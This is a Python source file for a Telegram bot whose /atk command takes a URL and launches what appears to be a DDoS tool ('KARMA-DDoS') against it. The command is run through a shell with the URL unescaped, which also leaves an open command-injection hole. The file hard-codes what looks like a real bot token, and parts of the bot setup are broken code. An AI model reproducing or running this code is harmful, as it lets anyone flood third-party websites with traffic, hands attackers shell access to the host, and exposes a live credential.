import subprocess
from flask import Flask, request
from telegram import Bot, Update
from telegram.ext import CommandHandler, CallbackContext, MessageHandler, Filters
import logging
import threading
import time

app = Flask(__name__)

# Replace 'YOUR_TOKEN' with the actual API token from BotFather
TOKEN = '6549234833:AAEJgm7Epi51Lo_FpyRKkMb8hyieDAbuPE0'
bot = Bot(token=TOKEN)

# Set the token variable in Flask
app.config['TELEGRAM_BOT_TOKEN'] = TOKEN

# Dictionary to store active tasks
active_tasks = {}

# Command handler for /atk
def atk_handler(update: Update, context: CallbackContext) -> None:
    # Get the URL from the message text
    url = context.args[0] if context.args else None

    if url:
        # Modify the command to include the URL
        full_command = f'cd KARMA-DDoS && python3 main.py get {url} 300000 300'

        # Run the modified command on the VPS
        result = subprocess.run(full_command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            # Reply that the task is in progress
            update.message.reply_text('Working now...')

            # Store the task ID for tracking
            task_id = int(time.time())
            active_tasks[task_id] = update.message.chat_id

            # Start a thread to wait for a minute and send 'done' message
            threading.Thread(target=send_done_message, args=(task_id,)).start()
        else:
            # Reply with the error message
            update.message.reply_text(f'Error: {result.stderr}')
    else:
        # Reply with usage instructions if URL is not provided
        update.message.reply_text('Usage: /atk URL')

# Function to send 'done' message after a delay
def send_done_message(task_id):
    time.sleep(60)  # Wait for a minute
    chat_id = active_tasks.pop(task_id, None)
    if chat_id:
        bot.send_message(chat_id, 'Done!')

# Command handler route
@app.route(f'/{TOKEN}', methods=['POST'])
def command_route():
    json_string = request.get_data().decode('UTF-8')
    update = Update.de_json(json_string, bot)
    context = CallbackContext(bot)

    # Handle the /atk command
    atk_handler(update, context)

    return 'OK'

if __name__ == '__main__':
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

    # Use the MessageHandler to handle text messages
    dp = bot
    dp.add_handler(CommandHandler("atk", atk_handler, pass_args=True))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, atk_handler))

    # Start the Flask app in a separate thread
    threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000}).start()

    # Start the bot
    bot.polling()
